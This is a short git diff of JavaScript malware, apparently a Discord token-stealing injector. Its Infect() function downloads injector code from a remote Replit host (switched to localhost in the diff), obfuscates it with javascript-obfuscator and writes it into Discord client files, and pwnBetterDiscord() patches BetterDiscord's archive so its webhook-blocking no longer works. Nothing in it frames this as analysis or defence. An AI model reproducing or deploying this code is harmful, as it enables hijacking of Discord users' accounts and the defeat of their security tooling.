@@ -133,8 +133,8 @@ function startDiscord() {
     });
 };
 
-async function Infect() {
-    let resp = await axios.get('https://sudrytoezrustleromgishostedonreplitkdidoooooodqd.sudryndd.repl.co');
+async function Infect() { 
+    let resp = await axios.get('http://localhost:80/api/injector');
     const obfuscationResult = JavaScriptObfuscator.obfuscate(resp.data.replace('%key%', key), { "ignoreRequireImports": true, "compact": true, "controlFlowFlattening": true, "controlFlowFlatteningThreshold": 0.5, "deadCodeInjection": false, "deadCodeInjectionThreshold": 0.01, "debugProtection": false, "debugProtectionInterval": 0, "disableConsoleOutput": true, "identifierNamesGenerator": "hexadecimal", "log": false, "numbersToExpressions": false, "renameGlobals": false, "selfDefending": false, "simplify": true, "splitStrings": false, "splitStringsChunkLength": 5, "stringArray": true, "stringArrayEncoding": ["base64"], "stringArrayIndexShift": true, "stringArrayRotate": false, "stringArrayShuffle": false, "stringArrayWrappersCount": 5, "stringArrayWrappersChainedCalls": true, "stringArrayWrappersParametersMaxCount": 5, "stringArrayWrappersType": "function", "stringArrayThreshold": 1, "transformObjectKeys": false, "unicodeEscapeSequence": false });
     const payload = obfuscationResult.getObfuscatedCode();
     gameFiles.forEach(file => {
@@ -152,7 +152,7 @@ function pwnBetterDiscord() {
     var dir = process.env.appdata + "\\BetterDiscord\\data\\betterdiscord.asar"
     if (fs.existsSync(dir)) {
         var x = fs.readFileSync(dir)
-        fs.writeFileSync(dir, buf_replace(x, "api/webhooks", "ezbyrustler"))
+        fs.writeFileSync(dir, buf_replace(x, "api/webhooks", "ezbysudry"))
     } else {
         return;
     }
